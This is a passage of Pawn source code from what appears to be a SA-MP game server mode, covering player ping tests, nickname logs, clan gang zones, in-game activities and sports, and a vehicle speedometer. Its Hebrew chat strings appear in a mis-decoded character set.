		if(strsrc[i] == delimiter || i == len2)
		{
			len = strmid(strdest[aNum],strsrc,li,i,128);
			strdest[aNum][len] = 0;
			li = i + 1;
			aNum++;
		}
		i++;
	}
	return 1;
}
//=[Reset2DString]==============================================================
stock Reset2DString(string[][],size = sizeof string) for(new i = 0; i < size; i++) string[i][0] = 0;
//=[GetDateFromINI]=============================================================
stock GetDateFromINI(f[],d='/')
{
	new string[32];
	format(string,sizeof(string),"%d%c%d%c%d",fgetint(f,"Day"),d,fgetint(f,"Month"),d,fgetint(f,"Year"));
	return string;
}
//=[SetPlayerAttachedText]======================================================
stock SetPlayerAttachedText(playerid,text[],textcolor,Float:x,Float:y,Float:z)
{
	playerinfo[playerid][p3dtext] = Create3DTextLabel(text,textcolor,0.0,0.0,0.0,15.0,-1);
	Attach3DTextLabelToPlayer(playerinfo[playerid][p3dtext],playerid,x,y,z);
}
//=[RemovePlayerAttachedText]===================================================
stock RemovePlayerAttachedText(playerid)
{
	if(playerinfo[playerid][p3dtext] != Text3D:INVALID_3DTEXT_ID) Delete3DTextLabel(playerinfo[playerid][p3dtext]);
	playerinfo[playerid][p3dtext] = Text3D:INVALID_3DTEXT_ID;
}
//=[EndPingTest]================================================================
stock EndPingTest(playerid)
{
	new adminID = INVALID_PLAYER_ID;
	for(new i = 0; i < MAX_PLAYERS_ && adminID == INVALID_PLAYER_ID; i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[i][apingtest][0] && playerinfo[i][apingtest][1] == playerid) adminID = i;
	if(adminID != INVALID_PLAYER_ID)
	{
		new string[M_S], Float:avg;
		format(string,sizeof(string)," ~~~ :%s - ·хЎрх· сущў· ЇщЁт ~~~",GetName(playerid));
		SendClientMessage(adminID,lightblue,string);
		string = "";
		for(new i = 0; i < 10; i++) format(string,sizeof(string),"%s%d%s",string,playerinfo[playerid][ppings][random(playerinfo[playerid][pingtest][2])],i == 9 ? ("") : (" | "));
		format(string,sizeof(string)," ЇщЁтщэ срў°рщх·: " @c(white) "%s",string);
		SendClientMessage(adminID,yellow,string);
		for(new i = 0; i < playerinfo[playerid][pingtest][2]; i++) avg += float(playerinfo[playerid][ppings][i]);
		avg = floatdiv(avg,float(playerinfo[playerid][pingtest][2]));
		format(string,sizeof(string)," ююхЎЄ: " @c(white) "%.3f",avg);
		SendClientMessage(adminID,yellow,string);
		format(string,sizeof(string)," Ёсуў сю∙ъ: " @c(white) "%d ∙Ёщх·",playerinfo[playerid][pingtest][2]);
		SendClientMessage(adminID,yellow,string);
		if(avg <= 8.0) string = "ч∙у - схш";
		else if(avg > 8.0 && avg <= 60.0) string = "Ёх°юрьщ";
		else if(avg > 60.0 && avg <= 90.0) string = "тсхф";
		else if(avg > 90.0 && avg <= 250.0) string = "тсхф юрху - ьрт°";
		else if(avg > 250.0) string = "тсхф юущ";
		else string = "ьр щухЄ";
		format(string,sizeof(string)," ущ°хт: " @c(white) "%s",string);
		SendClientMessage(adminID,yellow,string);
		playerinfo[adminID][apingtest] = {0,INVALID_PLAYER_ID};
	}
	playerinfo[playerid][pingtest] = {0,0,0};
}
//=[UpdateLastNicknameList]=====================================================
stock UpdateLastNicknameList(playerid,newname[])
{
	new f[64], k[16], k2[16], str[128];
	format(str,sizeof(str),folder_infonl "%s.txt",GetName(playerid));
	format(f,sizeof(f),folder_infonl "%s.txt",newname);
	if(!fexist(str))
	{
		fcreate(f);
		for(new i = 1; i <= SAVING_NICKNAMES; i++)
		{
			format(k,sizeof(k),"Nick%02d",i);
			if(!fkeyexist(f,k)) fsetstring(f,k,"X");
		}
	}
	else
	{
		frename(str,f);
		for(new i = SAVING_NICKNAMES-1; i > 1; i--)
		{
			format(k,sizeof(k),"Nick%02d",i);
			format(k2,sizeof(k2),"Nick%02d",i + 1);
			fsetstring(f,k2,fgetstring(f,k));
		}
	}
	format(str,sizeof(str),"%s %s -> %s",GetDateAsString(),GetTimeAsString(),GetName(playerid));
	fsetstring(f,"Nick01",str);
	return 1;
}
//=[CreateArea]=================================================================
stock CreateArea(Float:minx,Float:miny,Float:maxx,Float:maxy,type,param=0,interior=0,world=0,Float:minz=0.0,Float:maxz=0.0)
{
	new aid = minz == 0.0 ? CreateDynamicRectangle(minx,miny,maxx,maxy,world,interior) : CreateDynamicCube(minx,miny,minz,maxx,maxy,maxz,world,interior);
	if(aid == -1) return -1;
	areainfo[aid][areavalid] = 1;
	areainfo[aid][areacoords][0] = minx;
	areainfo[aid][areacoords][1] = miny;
	areainfo[aid][areacoords][2] = maxx;
	areainfo[aid][areacoords][3] = maxy;
	areainfo[aid][areaheight][0] = minz;
	areainfo[aid][areaheight][1] = maxz;
	areainfo[aid][areatype] = type;
	areainfo[aid][areaparam] = param;
	areainfo[aid][areaworld] = world;
	areainfo[aid][areainterior] = interior;
	return aid;
}
//=[DestroyArea]================================================================
stock DestroyArea(id)
{
	//if(IsAnyPlayerInDynamicArea(id)) for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInDynamicArea(i,id)) OnPlayerLeaveDynamicArea(i,id);
	DestroyDynamicArea(id);
	areainfo[id][areavalid] = 0;
	return 1;
}
//=[GetAreaCoords]==============================================================
stock GetAreaCoords(id,&Float:minx,&Float:miny,&Float:maxx,&Float:maxy) return (minx = areainfo[id][areacoords][0], miny = areainfo[id][areacoords][1], maxx = areainfo[id][areacoords][2], maxy = areainfo[id][areacoords][3]), 1;
//=[IsValidArea]================================================================
stock IsValidArea(id) return IsValidDynamicArea(id) && areainfo[id][areavalid];
//=[GetPlayerArea]==============================================================
stock GetPlayerArea(playerid) return playerinfo[playerid][parea];
//=[GetPlayerTeleportArea]======================================================
stock GetPlayerTeleportArea(playerid) return (playerinfo[playerid][tparea] != -1 && (areainfo[playerinfo[playerid][tparea]][areatype] == area_tele || areainfo[playerinfo[playerid][tparea]][areatype] == area_nstele)) ? areainfo[playerinfo[playerid][tparea]][areaparam] : -1;
//=[UpdateClanGangZone]=========================================================
stock UpdateClanGangZone(c)
{
	if(claninfo[c][cgzone] != INVALID_GANG_ZONE)
	{
		GangZoneHideForAll(claninfo[c][cgzone]);
		GangZoneDestroy(claninfo[c][cgzone]);
	}
	if(claninfo[c][cvalid] && GetClanHQ(c) != -1)
	{
		new Float:p[4];
    	GetHeadquarterArea(GetClanHQ(c),p[0],p[1],p[2],p[3]);
		claninfo[c][cgzone] = GangZoneCreate(p[0],p[1],p[2],p[3]);
		GetHQAveragePos(c,p[0],p[1],p[2]);
		p[3] = float(claninfo[c][cgzonesize] * 40);
		claninfo[c][cgzone] = GangZoneCreate(p[0]-p[3],p[1]-p[3],p[0]+p[3],p[1]+p[3]);
		if(claninfo[c][cgzoneshow]) GangZoneShowForAll(claninfo[c][cgzone],rgba2hex(claninfo[claninfo[c][cruler]][ccolor][0],claninfo[claninfo[c][cruler]][ccolor][1],claninfo[claninfo[c][cruler]][ccolor][2],150));
	}
}
//=[DestroyClanGangZone]========================================================
stock DestroyClanGangZone(c)
{
	GangZoneHideForAll(claninfo[c][cgzone]);
	GangZoneDestroy(claninfo[c][cgzone]);
	claninfo[c][cgzone] = INVALID_GANG_ZONE;
}
//=[ClanHexColor]===============================================================
stock ClanHexColor(c)
{
	new hexcolor[8];
	format(hexcolor,sizeof(hexcolor),"%s%s%s",IntToHex(claninfo[c][ccolor][0]),IntToHex(claninfo[c][ccolor][1]),IntToHex(claninfo[c][ccolor][2]));
	return hexcolor;
}
//=[HexStringOfColor]===========================================================
stock HexStringOfColor(c)
{
	new hexcolor[8];
	format(hexcolor,sizeof(hexcolor),"%s%s%s",IntToHex(getRed(c)),IntToHex(getGreen(c)),IntToHex(getBlue(c)));
	return hexcolor;
}
//=[GetPhoneModel]==============================================================
stock GetPhoneModel(id) return 18865 + id;
//=[PlayerStartUseCellPhone]====================================================
stock PlayerStartUseCellPhone(playerid)
{
	if(playerinfo[playerid][phone] > -1 && playerCanUseAnim(playerid) && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		if(playerinfo[playerid][phone] > 0)
		{
			ApplyAnimation(playerid,"PED","phone_in",4.1,0,1,1,1,1);
			SetPlayerAttachedObject(playerid,aoslot_cellphone,GetPhoneModel(playerinfo[playerid][phonemodel]),6,0.07,0.0,0.0,270.0,0.0,180.0);
		}
		else SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
}
//=[PlayerStopUseCellPhone]=====================================================
stock PlayerStopUseCellPhone(playerid)
{
	if(playerinfo[playerid][phone] > -1 && playerCanUseAnim(playerid) && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		if(playerinfo[playerid][phone] > 0)
		{
			ApplyAnimation(playerid,"PED","phone_out",4.1,0,1,1,1,1);
			if(IsPlayerAttachedObjectSlotUsed(playerid,aoslot_cellphone)) RemovePlayerAttachedObject(playerid,aoslot_cellphone);
		}
		else SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
}
//=[UpdatePlayerCellPhoneUsing]=================================================
stock UpdatePlayerCellPhoneUsing(playerid)
{
	if(playerinfo[playerid][phone] > -1 && playerCanUseAnim(playerid) && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
		ApplyAnimation(playerid,"PED","phone_talk",4.1,0,1,1,1,1);
		if(playerinfo[playerid][phone] > 0) SetPlayerAttachedObject(playerid,aoslot_cellphone,GetPhoneModel(playerinfo[playerid][phonemodel]),6,0.07,0.0,0.0,270.0,0.0,180.0);
	}
}
//=[ColouredText]===============================================================
stock ColouredText(text[],textcolor)
{
	new string[256];
	format(string,sizeof(string),"{%s}%s",HexStringOfColor(textcolor),text);
	return string;
}
//=[ResponseOfLastTopicFromForum]===============================================
forward ResponseOfLastTopicFromForum(index,response_code,data[]);
public ResponseOfLastTopicFromForum(index,response_code,data[])
{
	if(response_code == 200)
	{
		if(index == 1)
		{
			new string[M_S];
			format(string,sizeof(string)," :(фЁх∙р фрч°хя юфЇх°хэ ∙ьЁх (%s ·тхсх·",data);
			SendClientMessageToAll(0xF7A26FFF,string);
			HTTP(2,HTTP_GET,"sa-mp.co.il/lasttopic.php","","ResponseOfLastTopicFromForum");
		}
		else if(index == 2) SendClientMessageToAll(0xF7A26FFF,data);
	}
	return 1;
}
//=[SActivityName]==============================================================
stock SActivityName(actid,heb=0)
{
	new actname[64];
	//valstr(actname,actid);
	//SendClientMessageToAll(white,actname);
	if(actid >= sa_count) actid -= sa_count;
	switch(actid)
	{
		case sa_none: actname = "None";
		case sa_ftt: actname = heb ? ("юЎр р· фюшюхя") : ("Find The Treasure");
		case sa_party: actname = heb ? ("юёщсф") : ("Party!");
		case sa_ammusale: actname = heb ? ("юсЎЄ счЁх· Ё∙ў") : ("Ammunation Sale");
		case sa_dlotto: actname = heb ? ("урсь ьхшх") : ("Double Lotto");
		case sa_sail: actname = heb ? ("∙щщш сёЇщЁф") : ("Sailing Ship");
		case sa_sequence: actname = heb ? ("°Ўє ЇЄщьхщх·") : ("Activity Sequence");
		default: actname = "Unknown";
	}
	return actname;
}
//=[EndWarGame]=================================================================
stock EndWarGame(reason[],adminid)
{
	new string[M_S];
	assert wargameinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .схшьф %s фЇЄщьх·",warGames[wargameinfo[4]][wgName]);
	else format(string,sizeof(string)," .%s схшьф Єь щущ фрующя %s фЇЄщьх·",GetName(adminid),warGames[wargameinfo[4]][wgName]);
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inwargame] || playerinfo[i][waitwargame]))
		{
			if(playerinfo[i][inwargame])
			{
				SpawnPlayer(i);
				SetPlayerInterior(i,0);
				SetFreeze(i,0);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙фЇЄщьх· схшьф");
				GiveMoney(i,join_act,25);
				SetPlayerWorldBounds(i,20000.0,-20000.0,20000.0,-20000.0);
			}
			playerinfo[i][inwargame] = 0, playerinfo[i][waitwargame] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	wargameinfo[0] = 0, wargameinfo[1] = 0, wargameinfo[2] = 0, wargameinfo[4] = -1;
	KillTimer(wargameinfo[3]);
	thereIsAct = false;
	return 1;
}
//=[EndManhunt]=================================================================
stock EndManhunt(reason[],adminid)
{
	new string[M_S];
	assert manhuntinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .схшьф %s фЇЄщьх·",ManhuntTypes[manhuntinfo[4]][mhName]);
	else format(string,sizeof(string)," .%s схшьф Єь щущ фрующя %s фЇЄщьх·",GetName(adminid),ManhuntTypes[manhuntinfo[4]][mhName]);
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inmanhunt] || playerinfo[i][waitmanhunt]))
		{
			if(playerinfo[i][inmanhunt])
			{
				SpawnPlayer(i);
				SetPlayerInterior(i,0);
				SetFreeze(i,0);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙фЇЄщьх· схшьф");
				GiveMoney(i,join_act,25);
				SetPlayerToNormalColor(i);
			}
			playerinfo[i][inmanhunt] = 0, playerinfo[i][waitmanhunt] = 0, playerinfo[i][manhuntid] = 0;
			playerinfo[i][inact] = 0;
			TeamDefines(i);
		}
	}
	manhuntinfo[0] = 0, manhuntinfo[1] = 0, manhuntinfo[2] = 0, manhuntinfo[4] = -1, manhuntinfo[5] = -1;
	KillTimer(manhuntinfo[3]);
	thereIsAct = false;
	return 1;
}
//=[EndTeamActivity]============================================================
stock EndTeamActivity(reason[],adminid)
{
	new string[M_S];
	assert teamactinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .схшьф %s фЇЄщьх·",TeamActivities[teamactinfo[4]][taName]);
	else format(string,sizeof(string)," .%s схшьф Єь щущ фрующя %s фЇЄщьх·",GetName(adminid),TeamActivities[teamactinfo[4]][taName]);
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inteamact] || playerinfo[i][waitteamact]))
		{
			if(playerinfo[i][inteamact])
			{
				SpawnPlayer(i);
				SetPlayerInterior(i,0);
				SetFreeze(i,0);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙ЇЄщьх· фўсхЎх· схшьф");
				GiveMoney(i,join_act,25);
				SetPlayerToNormalColor(i);
			}
			playerinfo[i][inteamact] = 0, playerinfo[i][waitteamact] = 0, playerinfo[i][teamactid] = -1, playerinfo[i][teamactteam] = 0;
			playerinfo[i][inact] = 0;
			TeamDefines(i);
		}
	}
	teamactinfo[0] = 0, teamactinfo[1] = 0, teamactinfo[2] = 0, teamactinfo[4] = -1, teamactinfo[5] = 0, teamactinfo[6] = 0;
	KillTimer(teamactinfo[3]);
	thereIsAct = false;
	return 1;
}
//=[ConvertRaceRecordToInt]=====================================================
stock ConvertRaceRecordToInt(rec0,rec1,rec2) return rec0 + rec1*100 + rec2*6000;
//=[UsePlayerOption]============================================================
stock UsePlayerOption(playerid,option)
{
	playerinfo[playerid][poption] = option;
	new placeon = optioneds;
	for(new i = 0; i < optioneds; i++) if(optioned[i] == INVALID_PLAYER_ID) placeon = i;
	if(placeon == optioneds) optioneds++;
	optioned[placeon] = playerid;
	return 1;
}
//=[RemovePlayerOption]=========================================================
stock RemovePlayerOption(playerid)
{
	playerinfo[playerid][poption] = 0;
	for(new i = 0; i < optioneds; i++) if(optioned[i] == playerid)
	{
		optioned[i] = INVALID_PLAYER_ID;
		if(i == optioneds - 1) optioneds--;
	}
	return 1;
}
//=[IsPlayerUsingOption]========================================================
stock IsPlayerUsingOption(playerid,option) return playerinfo[playerid][poption] == option;
//=[IsPlayerUsingAnyOption]=====================================================
stock IsPlayerUsingAnyOption(playerid) return playerinfo[playerid][poption] > 0;
//=[GetClosestPlayer]===========================================================
stock GetClosestPlayer(p1)
{
	new Float:dis = 99999.99, Float:dis2, player = INVALID_PLAYER_ID;
	for(new x = 0; x < MAX_PLAYERS_; x++) if(IsPlayerConnected(x) && x != p1)
	{
		dis2 = GetDistanceBetweenPlayers(x,p1);
		if(dis2 < dis && dis2 != -1.00) dis = dis2, player = x;
	}
	return player;
}
//=[AddEnergy]==================================================================
stock AddEnergy(playerid,amount)
{
	new tmp = playerinfo[playerid][energy];
	if(playerinfo[playerid][energy] + amount > levels[playerinfo[playerid][level]][EnergyLimit]) playerinfo[playerid][energy] = levels[playerinfo[playerid][level]][EnergyLimit];
	else playerinfo[playerid][energy] += amount;
	if(playerinfo[playerid][logged] && playerinfo[playerid][energy] != tmp && !playerinfo[playerid][lasteupdate][0])
	{
		fsetint(fuser(playerid),"Energy",playerinfo[playerid][energy]);
		playerinfo[playerid][lasteupdate][0] = 60;
	}
	return 1;
}
//=[TakeEnergy]=================================================================
stock TakeEnergy(playerid,amount)
{
	new tmp = playerinfo[playerid][energy];
	if(playerinfo[playerid][energy] - amount < 0) playerinfo[playerid][energy] = 0;
	else playerinfo[playerid][energy] -= amount;
	if(playerinfo[playerid][logged] && playerinfo[playerid][energy] != tmp && !playerinfo[playerid][lasteupdate][0])
	{
		fsetint(fuser(playerid),"Energy",playerinfo[playerid][energy]);
		playerinfo[playerid][lasteupdate][0] = 60;
	}
	return 1;
}
//=[DefineSPWGun]===============================================================
stock DefineSPWGun(playerid,id,def)
{
	if(spAmmunation[id][spaWeapon] > 0)
	{
		new d[2], w = GetPlayerWeapon(playerid);
		GetPlayerWeaponData(playerid,GetWeaponSlot(spAmmunation[id][spaWeapon]),d[0],d[1]);
		if(PlayerHasWeapon(playerid,spAmmunation[id][spaWeapon]) || d[0] > 0) RemovePlayerWeapon(playerid,d[0]);
		if(def)
		{
			GiveWeapon(playerid,spAmmunation[id][spaWeapon],playerinfo[playerid][spwammo]);
			SetPlayerArmedWeapon(playerid,w);
		}
	}
}
//=[DefineSPWObject]============================================================
stock DefineSPWObject(playerid,id,def)
{
	if(spAmmunation[id][spaObject])
	{
		if(def) switch(id)
		{
			case spw_ggrenade: SetPlayerAttachedObject(playerid,aoslot_spw,342,6,0.0,0.0,0.0,0.0,0.0,0.0,3.0,3.0,3.0);
			case spw_smoke: SetPlayerAttachedObject(playerid,aoslot_spw,343,6,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,2.0);
			case spw_hammer: SetPlayerAttachedObject(playerid,aoslot_spw,18635,6,-0.28799989,-0.13599991,-0.00400000,6.20000123,4.30000638,3.59999966,5.0,5.0,5.0);
			case spw_doublem4: SetPlayerAttachedObject(playerid,aoslot_spw,356,5,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0);
			case spw_grandrpg: SetPlayerAttachedObject(playerid,aoslot_spw,359,6,0.0,0.0,0.0,0.0,0.0,0.0,2.5,2.5,2.5);
			case spw_taser: SetPlayerAttachedObject(playerid,aoslot_spw,18642,6,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0);
		}
		else if(IsPlayerAttachedObjectSlotUsed(playerid,aoslot_spw)) RemovePlayerAttachedObject(playerid,aoslot_spw);
	}
}
//=[Tip]========================================================================
stock Tip(playerid)
{
	if(SAMs)
	{
		new string[M_S];
		format(string,sizeof(string)," ╗ Tip: " @c(lightblue) "%s",SecondAutoMessage[random(SAMs)]);
		SendClientMessage(playerid,blue,string);
		PlaySound(playerid,1057);
	}
	return 1;
}
//=[TipAll]=====================================================================
stock TipAll()
{
	new string[M_S];
	format(string,sizeof(string)," ╗ Tip: " @c(lightblue) "%s",SecondAutoMessage[random(SAMs)]);
	SendClientMessageToAll(0x99CCCCFF,string);
	return 1;
}
//=[Speedometer]================================================================
stock Speedometer(playerid,act[])
{
	if(act[0] == 'c')
	{
		if(playerinfo[playerid][speedo] != INVALID_PLAYER_TEXT_DRAW) PlayerTextDrawDestroy(playerid,playerinfo[playerid][speedo]);
		playerinfo[playerid][speedo] = CreatePlayerTextDraw(playerid,513.000000,360.000000,VInfoTDFormat(GetPlayerVehicleID(playerid),playerid));
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][speedo],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][speedo],1);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][speedo],0.479999,1.600000);
		PlayerTextDrawColor(playerid,playerinfo[playerid][speedo],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][speedo],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][speedo],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][speedo],1);
		PlayerTextDrawUseBox(playerid,playerinfo[playerid][speedo],1);
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][speedo],641859152);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][speedo],628.000000,0.000000);
		PlayerTextDrawShow(playerid,playerinfo[playerid][speedo]);
	}
	else if(act[0] == 'd')
	{
		PlayerTextDrawHide(playerid,playerinfo[playerid][speedo]);
		PlayerTextDrawDestroy(playerid,playerinfo[playerid][speedo]);
		playerinfo[playerid][speedo] = INVALID_PLAYER_TEXT_DRAW;
	}
	else if(act[0] == 'u') PlayerTextDrawSetString(playerid,playerinfo[playerid][speedo],VInfoTDFormat(GetPlayerVehicleID(playerid),playerid));
	return 1;
}
//=[VInfoTDFormat]==============================================================
stock VInfoTDFormat(vehicleid,playerid)
{
	new str[128], vn[64], Float:vh, vs[32];
	GetVehicleHealth(vehicleid,vh);
	if(vh > 5000.0) str = "GM";
	else format(str,sizeof(str),"%03d%c",floatround(vh) / 10,'%');
	if(vehicleinfo[vehicleid][vspecial]) format(vn,sizeof(vn),vehicleinfo[vehicleid][vspecialname]);
	else format(vn,sizeof(vn),GetVehicleName(GetVehicleModel(vehicleid)));
	if(playerinfo[playerid][pkmh] > 400) vs = "400+";
	else format(vs,sizeof(vs),"%03d",playerinfo[playerid][pkmh]);
	if(vehicleinfo[vehicleid][vfuel] != -1) format(str,sizeof(str),"~b~%s~n~~g~Health: ~%c~%s~n~~y~KM/H: ~w~%s~n~~r~Fuel: ~w~%d%c",vn,vh < 250.0 ? 'r' : 'w',str,vs,vehicleinfo[vehicleid][vfuel],'%');
	else format(str,sizeof(str),"~b~%s~n~~g~Health: ~%c~%s~n~~y~KM/H: ~w~%s",vn,vh < 250.0 ? 'r' : 'w',str,vs);
	return str;
}
//=[SendClientMessage]==========================================================
#undef SendClientMessage
stock SendClientMessage2(playerid,msgcolor,text[],ttt=0)
{
	if(!ttt) if(playerinfo[playerid][nomsg]) return 1;
	return playerid == ConsoleID ? print(text) : SendClientMessage(playerid,msgcolor,text);
}
#define SendClientMessage SendClientMessage2
//=[SendClientMessageToAll]=====================================================
#undef SendClientMessageToAll
stock SendClientMessageToAll2(msgcolor,text[])
{
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !playerinfo[i][nomsg]) SendClientMessage(i,msgcolor,text);
	format(lastChatText,sizeof(lastChatText),text);
	return 1;
}
#define SendClientMessageToAll SendClientMessageToAll2
//=[SendTutorialMessage]========================================================
stock SendTutorialMessage(playerid,msgcolor,text[]) return playerid == ConsoleID ? print(text) : SendClientMessage(playerid,msgcolor,text,1);
//=[SendClientMessage]==========================================================
#undef TogglePlayerSpectating
stock TogglePlayerSpectating2(playerid,tog)
{
	playerinfo[playerid][specallowed] = tog;
	return TogglePlayerSpectating(playerid,tog);
}
#define TogglePlayerSpectating TogglePlayerSpectating2
//=[SportEndForPlayer]==========================================================
stock SportEndForPlayer(playerid,reason[])
{
	playerinfo[playerid][waitsport] = 0, playerinfo[playerid][insport] = 0, playerinfo[playerid][sportid] = -1, playerinfo[playerid][sportscore] = 0, playerinfo[playerid][sportparam] = 0;
	SetPlayerVirtualWorld(playerid,world_normal);
	SpawnPlayer(playerid);
	SetPlayerInterior(playerid,0);
	sportinfo[1]--;
	playerinfo[playerid][inact] = 0;
	if(sportinfo[8] == playerid) ReleaseSportParam();
	new t = playerinfo[playerid][team], p = 0, against = t, string[M_S];
	format(string,sizeof(string)," - :ЁЇёь, ёщсф %s юфўсхЎф %s",teaminfo[t][teamname],GetName(playerid));
	if(sportinfo[1] <= 5) for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][insport] || i == playerid))
	{
		SendClientMessage(i,red,string);
		SendClientMessage(i,red,reason);
		if(playerinfo[i][team] == playerinfo[playerid][team]) p++;
		else against = playerinfo[i][team];
	}
	if(!p)
	{
		format(string,sizeof(string)," !ЁщЎчф сЇЄщьх· фёЇх°ш %s фўсхЎф",teaminfo[against][teamname]);
		SendClientMessageToAll(yellow,string);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][insport])
		{
			SetPlayerInterior(i,0);
			SpawnPlayer(i);
			act_SaveWin(i,act_Code(aid_sport,sportinfo[5]));
			GiveMoney(i,headserver != i ? actprize_sport : actprize_sport*2,10);
			playerinfo[i][insport] = 0, playerinfo[i][waitsport] = 0, playerinfo[i][sportid] = -1, playerinfo[i][sportscore] = 0;
			playerinfo[i][inact] = 0;
		}
		sportinfo[0] = 0, sportinfo[1] = 0, sportinfo[2] = 0, sportinfo[4] = 0, sportinfo[5] = 0, sportinfo[6] = -1, sportinfo[7] = -1, sportinfo[8] = INVALID_PLAYER_ID, sportinfo[9] = -1;
		KillTimer(sportinfo[3]);
		thereIsAct = false;
	}
	return 1;
}
//=[ReleaseSportParam]==========================================================
stock ReleaseSportParam()
{
	if(sportinfo[9] != -1) DestroyObject(sportinfo[9]);
	if(sportinfo[5] == sport1_football) sportinfo[9] = CreateObject(1598,1347.3796,2139.8608,11.0156,0.0,0.0,0.0,object_show_distance/*,0,world_sport*/);
	else if(sportinfo[5] == sport2_basketball) sportinfo[9] = CreateObject(2114,0.0,0.0,0.0,0.0,0.0,0.0,object_show_distance/*,0,world_sport*/);
	sportinfo[8] = INVALID_PLAYER_ID;
	SportUpdate(2);
}
//=[SportUpdate]================================================================
stock SportUpdate(update,playerid=INVALID_PLAYER_ID)
{
	new message[256];
	switch(update)
	{
		case 1:
		{
			new teamscores[2];
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][insport] && playerinfo[i][sportscore] > 0) teamscores[playerinfo[i][team] == sportinfo[6] ? 0 : 1] += playerinfo[i][sportscore];
			format(message,sizeof(message),"[Team Scores] %s - %d Х %s - %d",teaminfo[sportinfo[6]][teamname],teamscores[0],teaminfo[sportinfo[7]][teamname],teamscores[1]);
		}
		case 2: message = "!фыух° чц° ьюўхюх";
		case 3: format(message,sizeof(message)," фцюя ∙Ёх·° Єу ёщхэ ЇЄщьх· фёЇх°ш: %d ∙Ёщх·",sportinfo[4]);
		case 4: format(message,sizeof(message)," !%s Єь щущ %s тхь ьўсхЎф",GetName(playerid),teaminfo[playerinfo[playerid][team]][teamname]);
		case 5: format(message,sizeof(message)," !%s Єь щущ %s тхь ЄЎющ ьўсхЎф",GetName(playerid),teaminfo[playerinfo[playerid][team]][teamname]);
		case 6: format(message,sizeof(message)," !сЄш р· фыух° %s",GetName(playerid));
		case 7:
		{
			new firstdub[][18] = {"фыух° Єс° ь","фыух° фхЄс° ь","хЄы∙щх фыух° ∙ь","фыух° ∙ь","хЄы∙щх фыух° рЎь"};
			format(message,sizeof(message)," !%s %s",GetName(playerid),firstdub[random(sizeof(firstdub))]);
		}
		case 8:
		{
			new dub[][16] = {"фыух° ю·чщь рЎь",":·Їё р· фыух°","фыух° рЎь","фыух° ∙ь"};
			format(message,sizeof(message)," !%s %s",GetName(playerid),dub[random(sizeof(dub))]);
		}
	}
	format(message,sizeof(message)," ╗ Sport Update: %s",message);
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][insport]) SendClientMessage(i,purple,message);
	return 1;
}
//=[EndSport]===================================================================
stock EndSport(reason[],adminid)
{
	new string[M_S];
	assert sportinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .ЇЄщьх· фёЇх°ш схшьф");
	else format(string,sizeof(string)," .%s ЇЄщьх· фёЇх°ш схшьф Єь щущ фрующя",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][insport] || playerinfo[i][waitsport]))
		{
			if(playerinfo[i][insport])
			{
				SpawnPlayer(i);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .ўщсь· ЇщЎхщ ыёЇщ [$" #join_act "] Єь ыъ ∙ЇЄщьх· фёЇх°ш схшьф");
				GiveMoney(i,join_act,25);
				DisablePlayerCheckpoint(i);
			}
			playerinfo[i][insport] = 0, playerinfo[i][waitsport] = 0, playerinfo[i][sportid] = -1, playerinfo[i][sportscore] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	sportinfo[0] = 0, sportinfo[1] = 0, sportinfo[2] = 0, sportinfo[4] = 0, sportinfo[5] = 0, sportinfo[6] = -1, sportinfo[7] = -1, sportinfo[8] = INVALID_PLAYER_ID, sportinfo[9] = -1;
